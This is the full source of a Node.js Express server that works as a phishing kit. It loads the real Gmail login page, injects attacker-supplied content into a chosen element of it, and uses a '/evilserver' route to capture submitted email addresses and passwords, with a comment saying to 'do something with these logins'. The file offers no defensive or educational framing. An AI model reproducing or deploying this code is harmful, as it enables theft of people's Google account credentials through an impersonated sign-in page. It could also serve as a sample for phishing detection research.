var path = require('path'),
  express = require('express'),
  bodyParser = require('body-parser'),
  cors = require('cors'),
  iframeReplacement = require('node-iframe-replacement');

var serverPort = process.env.PORT || 5000; //the port for running this server

// create an instance of express
var app = express();

// add iframe replacement to express as middleware (adds res.merge method)
app.use(iframeReplacement);

//cors: Learn more here -> https://dev.to/dougblackjr/cors-in-a-way-i-can-understand-501d
app.use(cors());

//set up bodyparser
app.use(bodyParser.json()); // support json encoded bodies
app.use(bodyParser.urlencoded({ extended: true })); // support encoded bodies

// view engine setup
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'ejs');

app.post('/evilserver', (req, res) => {
  var email = req.body.email || null;
  var password = req.body.password || null;

  console.log({ email, password });
  //do something with these logins

  res.json({ success: true });
});

// create simple route to test our evil page
app.get('/', (req, res) => {
  // respond to this request with our fake content embedded within the GMail web page
  res.merge('evil-iframe.ejs', {
    sourceUrl: 'https://mail.google.com/mail/u/0/', // the external/legit webpage's URL
    sourcePlaceholder: 'div[class="pwWryf bxPAYd"]', // css selector of the legit page. Here is where we will inject our phishing content.
  });
});

// start the server
app.listen(serverPort, () =>
  console.log(`Server running on port ${serverPort}`)
);
